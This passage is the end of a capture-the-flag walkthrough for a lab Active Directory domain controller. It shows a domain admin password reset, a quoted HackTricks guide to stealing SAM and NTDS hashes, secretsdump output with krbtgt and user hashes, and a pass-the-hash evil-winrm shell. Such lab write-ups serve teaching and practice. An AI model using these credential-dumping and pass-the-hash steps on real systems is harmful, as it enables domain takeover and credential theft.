SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators ←                           Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins ←                    Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

`hostname`:
```
DC01 ←
```

`net user Administrator H4ck3d!`:
```
The command completed successfully. ←
```

`exit`

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Stealing Windows Credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials)

[**#From Registry**]

The easiest way to steal those files is to get a copy from the registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Download** those files to your Kali machine and **extract the hashes** using:
```sh
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

[**#Extracting hashes from NTDS.dit**]

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
```sh
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

You can also **extract them automatically** using a valid domain admin user:
```sh
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-secretsdump 'SOUPEDECODE.LOCAL/FileServer$@192.168.56.128' -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash) ←
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets ←
[*] $MACHINE.ACC 
SOUPEDECODE\DC01$:aes256-cts-hmac-sha1-96:39e89cad5d0a0429ef6529ec5e6d936e07bfade3d1cde14b89a13d105bd1a917
SOUPEDECODE\DC01$:aes128-cts-hmac-sha1-96:9fb370e30a2ab66cdd4622e2fa5533b9
SOUPEDECODE\DC01$:des-cbc-md5:643183fb5e707fd5
SOUPEDECODE\DC01$:plain_password_hex:8d2798a2344e7a8da5e48e2f78f50d0b67ccba0e8ee56aee9079d5a36c6430d8bb75ad0999749f87ddecd25d4250019e27d066e8339e4185a598674c531c1bcf76c8159b95f87d429a0b47e0cf3f601ba785be59d5e5234fd0500b867651d272ddb5dcb5905e929b0e36820387327fb1078b00829fe36bfcf2e197e41ad32960b23637607d57fce889c3c59a82d06925663e9c02ce6d76e5805ffb5da3a83977e62690cba2563cd60485dd8b86488767e5b2bf8925eea29471b1de087a4959777375fedabb0abb214b0d89288e5fe344be602415ab26f18c76c0e5f53af73e923e5d8fdddf65b010d36dd4dc23cd0468
SOUPEDECODE\DC01$:aad3b435b51404eeaad3b435b51404ee:3a0eb2df1d9339b57e16e97da9665086:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14:::
soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671:::
soupedecode.local\pquinn4:1107:aad3b435b51404eeaad3b435b51404ee:92cdedd79a2fe7cbc8c55826b0ff2d54:::

[...]
```

`evil-winrm -i 192.168.56.128 -u Administrator -H 'bc4103a138c65bd0c9c68cde4333c155'`:
```
Enter Password: ←
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                   
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint ←
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

<🔄 Alternative Step>

`evil-winrm -i 192.168.56.128 -u Administrator -p 'H4ck3d!'`:
```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

</🔄 Alternative Step>

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
soupedecode\administrator ←
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Group Policy Creator Owners            Group            S-1-5-21-2986980474-46765180-2505414164-520 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Domain Admins                          Group            S-1-5-21-2986980474-46765180-2505414164-512 Mandatory group, Enabled by default, Enabled group ←
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Schema Admins                          Group            S-1-5-21-2986980474-46765180-2505414164-518 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/17/2024  10:41 AM                backup
-a----         6/17/2024  10:44 AM             32 root.txt ←
```

`type root.txt`:
```
a9564*************************** ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
